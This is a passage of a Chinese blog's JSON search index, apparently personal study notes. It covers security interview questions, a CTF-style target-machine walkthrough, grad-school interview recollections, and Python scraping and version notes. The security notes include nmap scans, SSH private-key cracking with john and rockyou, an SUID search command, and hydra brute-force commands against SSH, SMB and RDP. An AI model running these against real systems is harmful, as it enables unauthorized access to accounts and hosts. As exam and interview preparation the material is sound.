3.四次挥手断开一个TCP连接,需要客户端与服务器发送四个包来确认连接的断开。由于断开连接的过程中是保证数据不再发送了,才能够断开因为TCP是全双工的,因此,每个方向都要单独关闭当一方完成数据发送任务后,发送一个FIN来终止这一方向的连接,收到一个FIN只是意味着一方向不会再收到数据了,但是这个TCP连接上仍然能够发送数据,直到这一方也发送了FIN.首先进行关闭的一方执行主动关闭,另一方执行被动关闭.第一个关闭的最后等待2MSL第一次挥手:Client将FIN置为1,序号seq=M,发送给Server,进入FIN_WAIT_1状态第二次挥手：Server收到后,将ACK置为1,ack=M+1,响应给Client,进入CLOSE_WAIT状态Client收到响应后,进入FIN_WAIT_2状态第三次挥手：Server在结束所有数据传输后,将Fin置为1,seq=N+1,发送给Client,进入LAST_ACK状态第四次挥手：Client收到后,将ACK置为1,ack=N+1,响应给Server,进入TIME_WAIT状态,等待 2MSL后,进入CLOSED状态Server收到后,进入CLOSED状态 4.IP协议的首部结构首部协议一共是20个字节（固定）第一个4字节： 版本号；首部长度； 服务类型；总长度；第二个4字节：标识；标志；片偏移；第三个4字节：生存时间；协议；校验和；第四个4字节：源ip地址；第五个4字节：目的ip地址； 三、web安全1.常见的报错注入函数如果我们的输入能引起数据库报错就可以用报错注入，比较常规的就三个updatexml、extractvalue、floorfloor函数向下取整函数，经常搭配计数函数count和伪随机数函数rand使用 extractvalue(参数1，参数2) 参数1：xml文档字符串参数2：xpath格式字符串 该函数主要用来查找并解析xml文档 updatexml(参数1，参数2，参数3) 参数1：xml文档字符串参数2：xpath格式字符串参数3：替换字符串 该函数主要用来查找替换并解析xml文档，但是不会保存到数据库 两个函数的报错原理其实都一样，都是因为第二个参数不采用xpath格式的字符导致数据库报xpath格式错误，利用concat()函数把一个特殊字符与xpath连接在一起就可以报错。 2.文件上传的漏洞原因开发者没有对上传的文件后缀名作检测和过滤防护方法有：黑白名单、单独创建一个上传目录限制权限、放沙盒、加上特殊字符过滤机制绕waf方法：先判断是客户端检测还是服务端检测，如果是客户端就通过 burp抓包中间人绕过文件幻数检测：在文件幻数后面加上木马文件大小检测：就在一个完整的文件插入木马文件后缀名检测：尝试一些不在黑名单的后缀名，大小写，下划线表示空格绕过中间解析件绕过(IIS5和6、apache) 3.burp有哪些功能它的核心功能就是抓包改包，其次它的爬虫(将目标网站所有的网页让工具走一遍，然后配合filter找出有参数的页面)、扫描,然后repeater模块可以改一些payload(关键信息)然后重复发送请求，intruder模块可以爆破字典，还有编解码，一些插件比如说CO2也很有用，可以配合sqlmap 4.dirsearch/dirmap扫目录的功能,自己尝试写(go,python)整体的功能模块：指定一个字典让它去扫,api探测,对404页面做判断(404并不一定没有东西，有时候那个路径下还有一层递归)要加快扫描速度有2种方法：多线程、异步有时404页面会在后端统一处理成200，要怎么检测这种错误页面：可以输入一个随机字符串作为目录路径，如果返回200，把这个页面记录下来，用python里的dif来判断相似度，如果相似度很高就可以认为这个页面是错误页面 5.sqlmapos-shell的原理(mysql)：可以执行系统命令，一般是先传一个马作为一个上传，再传一个马作为命令执行，退出的时候会自动把马清除掉 6.sql注入绕waf的方式跑关键字字典， 7.IIS搭建的网站如何找漏洞？先看版本(5和6) 8.XSS除了盗取Cookie还能干嘛？转发邮件、记录键盘、钓鱼、转发邮件、刷流量劫持后台、纂改页面、 9.手工检测webshell正则表达式检测pHp,eval之类的 10.正向连接和反向连接在要攻击的服务器有端口，从我这边直接连到它在要攻击的服务器上运行个程序，使它连接我 11.写爬虫有哪些常用的模块？request,正则函数,beautifulsoup4, 12.eval和system区别13.拿到一个靶机ip后1.拿到ip后可用nmap -sV探测其开放的服务端口(http,ssh,https) 123nmap -sV IP 探测开放的服务和服务的版本nmap -A IP 探测全部信息nmap -O IP 探测操作系统类型和版本 2.http端口看一下页面内容和源代码(尤其是联系人等信息很可能就是ssh的用户名信息)3.dirb/dirsearch/nikto/御剑爆破当前端口的目录(爆特定文件 -X php)，递归访问，力争把每个扫描到的目录页面都看一下,有没有什么奇怪的文件名4.对于开发ssh服务的，看看能否拿到id_rsa注意特殊端口(&gt;1024的端口是用户自行支配的，特别敏感，日常用的是0~1023，) 14.ssh 远程登录认证方式：我们要拿到私钥，和服务器上的公钥进行对比，对比成功即可登录服务器(看到页面的字符内容要想到是否是一个文件)对于ssh服务的22端口，考虑两种方法：暴力破解和私钥泄露1.先尝试通过私钥文件登录，先查看私钥文件权限(ls -alh)2.赋予私钥文件可读可写的权限(chmod 600 文件)3.ssh -i 私钥文件 用户名@主机ip4.如果需要密码(密码爆破神器hydra)，继续识别私钥文件(sshjohn 私钥文件 &gt; 输出到的转换后的文件)5.zcat /user/share/wordlists/rockyou.txt.gz | john –pipe –rules rsacrack(用rsacrack的规则通过管道传给john)6.登录到主机，但不是root用户，可以先查看下root文件夹有没有flag7.-find / -perm -4000 2&gt;/dev/null(查看具有root权限的文件，并不报错)8.找栈溢出漏洞 SimonAAAAA/bin/sh 15.信息收集子域名查询：就是在域名前面加上.和一些字符 1234域名 zkaq.cn# 顶级域名 bbs.zkaq.cn # 子域名 www.zkaq.cn # 子域名 端口：电脑传输数据的一个通道，一般对应一个服务1.目录/敏感文件扫描2.js接口探测-&gt;能发现很多未授权方面的漏洞 jsfinderburp插件 jsfinder3.网站源码 中间件 –wappalyzer浏览器插件4.谷歌语法 最大作用：过滤搜索内容 1234567+充值 -支付 # +代表必须带关键字，-代表必须减去关键字 “酒店管理” # 作为整体进行搜索 site:baidu.com # 搜出来的网站的域名 必须是baidu.com inurl:？id # 搜出来的网站的网址必须带有？id intitle：充值 # 标题里面必须带有充值 intext：充值 # 正文必须带有充值 filetype:pdf # 找资源 --限制文件类型 5.密码爆破:hydra和crunch支持全平台和协议windows:https://github.com/maaaaz/thc-hydra-windows 12345678910-R：继续从上一次进度开始破解-S：大写，采用SSL链接(https-s：小写，指定端口-l：指定破解的用户，对特定用户破解(找到用户名后)-L：指定用户名字典，爆破用户名-P：大写，指定密码字典-e：nsr，n:空密码破解 s：使用的user作为密码破解 r：反向密码-o：指定结果输出文件-t：同时运行的线程数，交替为16-w：设置最大超时的时间，单位秒，每次是30s 123456SMB服务很稳定，跑得快，不容易ban掉iphydra -l 用户名 -P 密码字典 smb://ip –vWindows远程登陆密码破解：hydra -l 用户名 -p 密码 rdp://ip –v破解sshhydra -l 用户名 -P 密码字典 -t 线程 -vV -e nsr ip ssh 6.子域名查询 123451.谷歌语法2.证书搜索https的网站：https://crt.sh/3.基于DNS查询DNS解析记录：能返回子域名和IPhttps://dns.bufferover.run/dns?q=目标域名如 xx.com4.爆破：Sublist3r 子域名挖掘机(设置域名层数) 只要你收集到目标的一些模糊的信息，就可以针对性生成一个字典用来爆破。知道密码的一部分细节后，可以针对性的生成字典。7.地理位置查询seeker和ngrok 总结 参考资料","link":"/2022/04/18/private/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E7%BB%8F/"},{"title":"面经","text":"摘要：面经 一、机考(一小时)用所里给的电脑，人工判。要求都是可以编译运行，自己编测试用例，自己测试，自己注释第一题就是给一个字符串，去掉所有非字母的字符；(遍历+判断)第二题是找出动态数组中的最大值；第三题是编写函数题，给定一个链表和一个n，去掉倒数第n个节点，然后输出这个链表。(将下一个节点复制到该节点，然后删掉下一个节点,下一个可能是null)两道程序填空题加一道附加的完整编程题。完整的编程题大概是对字符串进行一些处理的模拟题排序(冒泡、快速)实现字符串匹配的算法，返回字符串匹配的下标。要求时间复杂度O(n)给一个整数数组，要求实现非递归的快排。(用栈)给一个单链表的头结点，然后判断这个链表是不是回文结构(反转链表O(n)，然后用list记录反转前和反转后是不是一样)用C++实现一个简单的智能指针类，构造，析构，拷贝构造，赋值=函数,指向-&gt;，都得实现linux的sh命令 二、英语(大约5分钟)先是自我介绍1分钟，然后老师会问两到三个问题。一般问的都是和生活相关的Q1:你大学最喜欢哪门课程Q2:可以介绍一下这门课吗Q3:平时都有神马兴趣爱好Q4:最喜欢看哪本书？介绍一下大概情节不太问专业问题，但是要知道专业课的名字之类 三、PPT面试(16-20分钟)问好，5分钟陈述自己的PPT WEB安全:一个浏览器接收请求到后端的整个处理过程以及前端如何优化、如何检测webshell有没有backdoor的问题 123456789Q1:你了解的安全漏洞有哪些Q2:介绍一下缓冲区溢出Q3:堆和栈的区别？SQL注入怎么实现Android的安全模型数据库访问我说对网络入侵中的僵尸网络很感兴趣，然后问了我DDoS和DoS的差别,又问了我一句懂不懂Syn Flood网络的基础问题对网络攻防的看法 学硕、专硕、直博:最想要学硕，其次是专硕 一些与专业无关的问题，比如问我的兴趣爱好(老师比较在意一个人的一些习惯、团队精神之类的,有没有规律的运动，每天会坚持长跑三千米，然后每周会和朋友一起去打球，因为我觉得多运动也能提高学习效率)，家住哪里(广东省阳江市，粤西那边的），学校实习的情况(拿到了绿盟的暑期实习offer,打算趁此机会提升技术，感受实际攻防情况) 六室问题偏实践，如果你有项目一定要好好准备，课程设计也挑一个最有把握的准备，然后要大致清楚自己的代码量 四、无PPT面试先有个自我介绍，主要是和组里的具体需求相关的来问你如果没碰过安全的话，应该是以类似面试宝典问的东西类似吧。我看到上一个同学好像问了好些编程的，还在草稿纸上比划了不少。 大概就是一个链表除了本身的后继节点，还存了一个随机的某个节点的地址，然后问你复制这样的一个链表需要的时间复杂度和空间复杂度 web:有SSRF的防护手段，SQL注入的本质，拿到webshell怎么提权，安全工具都用过啥，php的trick之类的 总结 参考资料","link":"/2022/04/18/private/%E9%9D%A2%E7%BB%8F/"},{"title":"python_scrapy","text":"摘要：本文介绍了爬虫项目 安装依赖12pip install lxmlconda install bs4 一.前置知识爬虫在使用场景中的分类 通用爬虫： 抓取系统重要组成部分。抓取的是一整张页面数据。 聚焦爬虫： 是建立在通用爬虫的基础之上。抓取的是页面中特定的局部内容。 增量式爬虫： 检测网站中数据更新的情况。只会抓取网站中最新更新出来的数据。 http协议 User-Agent：请求载体的身份标识 Connection：请求完毕后，是断开连接还是保持连接 二、requests库1234#step_1:指定url#step_2:发起请求#step_3:获取响应数据.text返回的是字符串形式的响应数据#step_4:持久化存储 翻译页面局部刷新-&gt;ajax请求 三、数据解析1.正则解析12345&lt;div class=&quot;thumb&quot;&gt;&lt;a href=&quot;/article/121721100&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;//pic.qiushibaike.com/system/pictures/12172/121721100/medium/DNXDX9TZ8SDU6OK2.jpg&quot; alt=&quot;指引我有前进的方向&quot;&gt;&lt;/a&gt;&lt;/div&gt; 1ex = '&lt;div class=&quot;thumb&quot;&gt;.*?&lt;img src=&quot;(.*?)&quot; alt.*?&lt;/div&gt;' 2.bs4- 数据解析的原理： - 1.标签定位 - 2.提取标签、标签属性中存储的数据值 - bs4数据解析的原理： - 1.实例化一个BeautifulSoup对象，并且将页面源码数据加载到该对象中 - 2.通过调用BeautifulSoup对象中相关的属性或者方法进行标签定位和数据提取 - 环境安装： - pip install bs4 - pip install lxml - 如何实例化BeautifulSoup对象： - from bs4 import BeautifulSoup - 对象的实例化： - 1.将本地的html文档中的数据加载到该对象中 fp = open('./test.html','r',encoding='utf-8') soup = BeautifulSoup(fp,'lxml') - 2.将互联网上获取的页面源码加载到该对象中 page_text = response.text soup = BeatifulSoup(page_text,'lxml') - 提供的用于数据解析的方法和属性： - soup.tagName:返回的是文档中第一次出现的tagName对应的标签 - soup.find(): - find('tagName'):等同于soup.div - 属性定位： -soup.find('div',class_/id/attr='song') - soup.find_all('tagName'):返回符合要求的所有标签（列表） - select： - select('某种选择器（id，class，标签...选择器）'),返回的是一个列表。 - 层级选择器： - soup.select('.tang &gt; ul &gt; li &gt; a')：&gt;表示的是一个层级 - oup.select('.tang &gt; ul a')：空格表示的多个层级 - 获取标签之间的文本数据： - soup.a.text/string/get_text() - text/get_text():可以获取某一个标签中所有的文本内容 - string：只可以获取该标签下面直系的文本内容 - 获取标签中属性值： - soup.a['href'] 3.xpathxpath解析：最常用且最便捷高效的一种解析方式。通用性。 - xpath解析原理： - 1.实例化一个etree的对象，且需要将被解析的页面源码数据加载到该对象中。 - 2.调用etree对象中的xpath方法结合着xpath表达式实现标签的定位和内容的捕获。 - 环境的安装： - pip install lxml - 如何实例化一个etree对象:from lxml import etree - 1.将本地的html文档中的源码数据加载到etree对象中： etree.parse(filePath) - 2.可以将从互联网上获取的源码数据加载到该对象中 etree.HTML('page_text') - xpath('xpath表达式') - xpath表达式: - /:表示的是从根节点开始定位。表示的是一个层级。 - //:表示的是多个层级。可以表示从任意位置开始定位。 - 属性定位：//div[@class='song'] tag[@attrName=&quot;attrValue&quot;] - 索引定位：//div[@class=&quot;song&quot;]/p[3] 索引是从1开始的。 - 取文本： - /text() 获取的是标签中直系的文本内容 - //text() 标签中非直系的文本内容（所有的文本内容） - 取属性： /@attrName ==&gt;img/src 总结","link":"/2022/05/25/python_scrapy/"},{"title":"CSRF漏洞","text":"摘要：本文介绍windows系统如何同时安装Python2和Python3，以及如何兼容并切换使用 一.安装和配置必要依赖1.下载python2.7.15py2 2.安装python2不论python2还是python3，python可执行文件都叫python.exe，在cmd下输入python得到的版本号取决于环境变量里哪个版本的python路径更靠前，毕竟windows是按照顺序查找的。 二、切换12345py -2调用python2，py -3调用的是python3.py -2 -m pip install xxxpy -3 -m pip install xxx当python脚本需要python2运行时，只需在脚本前加上#! python2，然后运行py xxx.py即可。同理#! python3 原理是python3以后会自动在C盘windows目录安装一个py.exe作为python的版本管理器(读取py.ini和注册表的python路径？所以安装python的路径要想好，之后不能随便移动) 总结 参考资料1.教你们如何切换Python2与Python3","link":"/2022/05/25/windows%E7%B3%BB%E7%BB%9Fpy2%E5%92%8Cpy3%E7%9A%84%E5%85%B1%E5%AD%98%E4%B8%8E%E5%88%87%E6%8D%A2/"},{"title":"","text":"Document","link":"/2022/05/27/private/test/"},{"title":"CSRF漏洞","text":"摘要：本文介绍了CSRF漏洞的定义和攻击方法 前言 一.安装和配置必要依赖 总结 参考资料","link":"/2022/04/18/private/%E6%A8%A1%E6%9D%BF/"}],"tags":[{"name":"Signal and System","slug":"Signal-and-System","link":"/tags/Signal-and-System/"},{"name":"FFT","slug":"FFT","link":"/tags/FFT/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Icarus","slug":"Icarus","link":"/tags/Icarus/"},{"name":"Blog","slug":"Blog","link":"/tags/Blog/"},{"name":"Github","slug":"Github","link":"/tags/Github/"},{"name":"https","slug":"https","link":"/tags/https/"},{"name":"kali","slug":"kali","link":"/tags/kali/"},{"name":"vmware","slug":"vmware","link":"/tags/vmware/"},{"name":"cookie","slug":"cookie","link":"/tags/cookie/"},{"name":"head response","slug":"head-response","link":"/tags/head-response/"},{"name":"http","slug":"http","link":"/tags/http/"},{"name":"python","slug":"python","link":"/tags/python/"},{"name":"robots协议","slug":"robots协议","link":"/tags/robots%E5%8D%8F%E8%AE%AE/"},{"name":"spider","slug":"spider","link":"/tags/spider/"},{"name":"url","slug":"url","link":"/tags/url/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"sql注入","slug":"sql注入","link":"/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"splmap","slug":"splmap","link":"/tags/splmap/"},{"name":"algorithm","slug":"algorithm","link":"/tags/algorithm/"},{"name":"acwing","slug":"acwing","link":"/tags/acwing/"},{"name":"C++","slug":"C","link":"/tags/C/"},{"name":"CSRF","slug":"CSRF","link":"/tags/CSRF/"},{"name":"trojan","slug":"trojan","link":"/tags/trojan/"},{"name":"sql","slug":"sql","link":"/tags/sql/"},{"name":"redis","slug":"redis","link":"/tags/redis/"},{"name":"proxypool","slug":"proxypool","link":"/tags/proxypool/"},{"name":"tor","slug":"tor","link":"/tags/tor/"},{"name":"socks5","slug":"socks5","link":"/tags/socks5/"},{"name":"object-oriented","slug":"object-oriented","link":"/tags/object-oriented/"},{"name":"reverse","slug":"reverse","link":"/tags/reverse/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"html","slug":"html","link":"/tags/html/"},{"name":"css","slug":"css","link":"/tags/css/"},{"name":"js","slug":"js","link":"/tags/js/"},{"name":"ES6","slug":"ES6","link":"/tags/ES6/"},{"name":"React","slug":"React","link":"/tags/React/"},{"name":"Vue3","slug":"Vue3","link":"/tags/Vue3/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"server","slug":"server","link":"/tags/server/"},{"name":"Internet","slug":"Internet","link":"/tags/Internet/"},{"name":"web ctf","slug":"web-ctf","link":"/tags/web-ctf/"},{"name":"scrapy","slug":"scrapy","link":"/tags/scrapy/"}],"categories":[{"name":"EE","slug":"EE","link":"/categories/EE/"},{"name":"CS","slug":"CS","link":"/categories/CS/"},{"name":"Signal and System","slug":"EE/Signal-and-System","link":"/categories/EE/Signal-and-System/"},{"name":"Blog","slug":"CS/Blog","link":"/categories/CS/Blog/"},{"name":"security","slug":"CS/security","link":"/categories/CS/security/"},{"name":"algorithm","slug":"CS/algorithm","link":"/categories/CS/algorithm/"},{"name":"面经","slug":"CS/面经","link":"/categories/CS/%E9%9D%A2%E7%BB%8F/"}]}